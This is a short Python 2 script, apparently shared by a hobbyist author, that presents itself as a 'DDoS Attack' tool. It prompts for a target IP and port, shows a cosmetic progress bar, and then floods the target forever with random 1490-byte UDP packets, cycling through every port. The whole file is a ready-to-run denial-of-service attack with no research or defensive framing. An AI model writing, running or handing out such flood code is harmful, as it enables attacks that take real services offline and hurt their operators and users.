# ____  ____                 _   _   _             _    
#|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
#| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
#| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   < 
#|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
#                                                       
#                                         ~BY NAVEEN DONEPUDI
#                             
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

print
print "Author   : NAVEEN DONEPUDI"
print "You Tube : https://www.youtube.com/channel/UCGURaSlQ3YNn7oEH3fG_4ZA"
print "github   : https://github.com/naveendonepudi1419"
print "Facebook : https://www.facebook.com/naveen.c.donepudi"
print "Instagram: https://www.intagram.com/naveendonepudi1419"      
ip = raw_input("IP Target : ")
port = input("Port        : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[.....               ] 25%"
time.sleep(5)
print "[.........           ] 50%"
time.sleep(5)
print "[.............       ] 75%"
time.sleep(5)
print "[....................] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

